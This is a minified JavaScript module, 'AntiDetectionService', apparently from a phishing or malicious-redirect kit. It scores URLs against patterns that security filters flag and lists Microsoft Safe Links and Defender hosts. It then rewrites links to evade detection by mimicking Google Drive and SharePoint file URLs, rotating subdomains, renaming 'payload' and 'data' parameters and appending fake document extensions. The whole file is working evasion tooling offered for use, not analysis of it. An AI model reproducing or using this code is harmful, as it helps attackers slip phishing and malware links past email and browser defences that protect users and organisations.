var p=Object.defineProperty;var l=(n,e,t)=>e in n?p(n,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):n[e]=t;var c=(n,e,t)=>l(n,typeof e!="symbol"?e+"":e,t);class m{constructor(){c(this,"detectionPatterns",[{pattern:/\/e\/[a-zA-Z0-9]+/,severity:"critical",description:"Classic /e/ redirect pattern - highly detected",category:"url_structure"},{pattern:/\/redirect\?/i,severity:"high",description:"Obvious redirect keyword in URL",category:"url_structure"},{pattern:/\/click\?/i,severity:"high",description:"Click tracking pattern",category:"url_structure"},{pattern:/\/track\?/i,severity:"high",description:"Tracking pattern",category:"url_structure"},{pattern:/\/go\?/i,severity:"medium",description:"Generic redirect pattern",category:"url_structure"},{pattern:/\/link\?/i,severity:"medium",description:"Link redirect pattern",category:"url_structure"},{pattern:/[?&]url=[^&]+/i,severity:"high",description:"URL parameter containing target URL",category:"parameter"},{pattern:/[?&]target=[^&]+/i,severity:"high",description:"Target parameter",category:"parameter"},{pattern:/[?&]dest=[^&]+/i,severity:"medium",description:"Destination parameter",category:"parameter"},{pattern:/[?&][a-z]=[A-Z0-9]{20,}/,severity:"medium",description:"Single letter parameter with long encoded value",category:"parameter"},{pattern:/[?&]data=[A-Za-z0-9+\/=]{30,}/,severity:"high",description:"Base64-like data parameter",category:"parameter"},{pattern:/[?&]payload=[^&]+/i,severity:"critical",description:"Payload parameter - security red flag",category:"parameter"},{pattern:/phish/i,severity:"critical",description:"Phishing keyword",category:"content"},{pattern:/malware/i,severity:"critical",description:"Malware keyword",category:"content"},{pattern:/suspicious/i,severity:"high",description:"Suspicious keyword",category:"content"},{pattern:/base64/i,severity:"medium",description:"Base64 reference",category:"content"},{pattern:/encoded/i,severity:"medium",description:"Encoded reference",category:"content"},{pattern:/decrypt/i,severity:"high",description:"Decrypt reference",category:"content"}]);c(this,"evasionStrategies",[{id:"legitimate_service_mimicry",name:"Legitimate Service Mimicry",description:"Mimic URLs from trusted services like Google Drive, OneDrive, etc.",effectiveness:95,riskLevel:"low",applicableProviders:["microsoft","google","corporate","generic"],implementation:e=>this.applyServiceMimicry(e)},{id:"subdomain_rotation",name:"Subdomain Rotation",description:"Use different subdomains to distribute reputation",effectiveness:85,riskLevel:"low",applicableProviders:["microsoft","google","corporate","generic"],implementation:e=>this.applySubdomainRotation(e)},{id:"time_based_obfuscation",name:"Time-Based Obfuscation",description:"Change URL patterns based on time of day",effectiveness:80,riskLevel:"medium",applicableProviders:["microsoft","google","corporate"],implementation:e=>this.applyTimeBasedObfuscation(e)},{id:"parameter_camouflage",name:"Parameter Camouflage",description:"Disguise encrypted parameters as legitimate ones",effectiveness:90,riskLevel:"low",applicableProviders:["microsoft","google","corporate","generic"],implementation:e=>this.applyParameterCamouflage(e)},{id:"content_type_spoofing",name:"Content-Type Spoofing",description:"Make URLs appear to serve legitimate file types",effectiveness:88,riskLevel:"low",applicableProviders:["microsoft","google","corporate","generic"],implementation:e=>this.applyContentTypeSpoofing(e)},{id:"behavioral_timing",name:"Behavioral Timing",description:"Mimic human browsing patterns in timing",effectiveness:75,riskLevel:"medium",applicableProviders:["corporate","generic"],implementation:e=>this.applyBehavioralTiming(e)}]);c(this,"microsoftEvasionPatterns",[/safelinks\.protection\.outlook\.com/i,/protection\.office\.com/i,/atp\.microsoft\.com/i,/windowsdefender/i,/microsoft\.security/i,/threat\.protection/i])}analyzeDetectionRisk(e){const t=[];for(const a of this.detectionPatterns)a.pattern.test(e)&&t.push(a);let r="low";t.some(a=>a.severity==="critical")?r="critical":t.some(a=>a.severity==="high")?r="high":t.some(a=>a.severity==="medium")&&(r="medium");const i=this.generateRecommendations(t);return{riskLevel:r,detectedPatterns:t,recommendations:i}}applyAntiDetection(e,t){let r=e;const i=this.evasionStrategies.filter(s=>s.applicableProviders.includes(t.targetProvider));i.sort((s,o)=>o.effectiveness-s.effectiveness);const a=this.selectStrategies(i,t.aggressiveness);for(const s of a)try{r=s.implementation(r,t)}catch(o){console.warn(`Failed to apply strategy ${s.id}:`,o)}return r}generateMicrosoftSafeUrl(e){const t=Date.now().toString(),r=Math.random().toString(36).substring(2,8);return`/sites/corporate/Shared%20Documents/Reports/${t.slice(-6)}/document_${r}.pdf?web=1&download=1`}generateGoogleSafeUrl(e){const t=this.generateGoogleFileId(),r=this.generateResourceKey();return`/file/d/${t}/view?usp=sharing&resourcekey=${r}`}applyServiceMimicry(e){const{behavioralMimicry:t}=require("./behavioralMimicry"),r=t.selectOptimalPattern({preferHighTrust:!0,avoidDetection:!0}),i=t.generateServiceParameters(r);let a=r.template;return Object.entries(i).forEach(([s,o])=>{a=a.replace(`{${s}}`,o)}),a}applySubdomainRotation(e){const{subdomainRotation:t}=require("./subdomainRotation");return t.buildSubdomainUrl("example.com",e,{preferHighTrust:!0,balanceUsage:!0}).url}applyTimeBasedObfuscation(e){const{timeBasedRotation:t}=require("./timeBasedRotation"),r=t.selectTimeBasedPattern(),i=t.generateTimeBasedParameters(r);let a=r.template;return Object.entries(i).forEach(([s,o])=>{a=a.replace(`{${s}}`,o)}),a}applyParameterCamouflage(e){const t={data:"doc",payload:"file",encrypted:"id",target:"ref",dest:"source"};let r=e;return Object.entries(t).forEach(([i,a])=>{const s=new RegExp(`([?&])${i}=`,"gi");r=r.replace(s,`$1${a}=`)}),r}applyContentTypeSpoofing(e){if(!e.includes(".")){const t=[".pdf",".docx",".xlsx",".pptx"],r=t[Math.floor(Math.random()*t.length)],i=e.indexOf("?");return i>-1?e.substring(0,i)+r+e.substring(i):e+r}return e}applyBehavioralTiming(e){const t=new Date,r=t.getHours()>=9&&t.getHours()<=17,i=t.getDay()>=1&&t.getDay()<=5;if(r&&i){const a=Math.floor(t.getTime()/1e3);return this.addParameter(e,"timestamp",a.toString())}else{const a=Math.floor(t.getTime()/6e4);return this.addParameter(e,"time",a.toString())}}selectStrategies(e,t){switch(t){case"conservative":return e.filter(r=>r.riskLevel==="low").slice(0,2);case"moderate":return e.filter(r=>r.riskLevel!=="high").slice(0,3);case"aggressive":return e.slice(0,4);default:return e.slice(0,2)}}generateRecommendations(e){const t=[],r=[...new Set(e.map(i=>i.category))];return r.includes("url_structure")&&t.push("Use legitimate service mimicry patterns instead of obvious redirect structures"),r.includes("parameter")&&t.push("Camouflage suspicious parameters with legitimate-looking names"),r.includes("content")&&t.push("Avoid security-related keywords in URLs and parameters"),e.some(i=>i.severity==="critical")&&t.push("CRITICAL: Completely redesign URL structure to avoid detection"),t}generateGoogleFileId(){return`1${this.generateRandomString(32)}`}generateResourceKey(){return`0-${this.generateRandomString(39)}`}generateRandomString(e){const t="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";let r="";for(let i=0;i<e;i++)r+=t.charAt(Math.floor(Math.random()*t.length));return r}addParameter(e,t,r){const i=e.includes("?")?"&":"?";return`${e}${i}${t}=${r}`}getAllDetectionPatterns(){return[...this.detectionPatterns]}getAllEvasionStrategies(){return[...this.evasionStrategies]}testUrl(e){const t=this.analyzeDetectionRisk(e),i={low:25,medium:50,high:75,critical:100}[t.riskLevel];return{isSafe:i<=25,riskScore:i,analysis:t}}}const g=new m;export{m as AntiDetectionService,g as antiDetection};
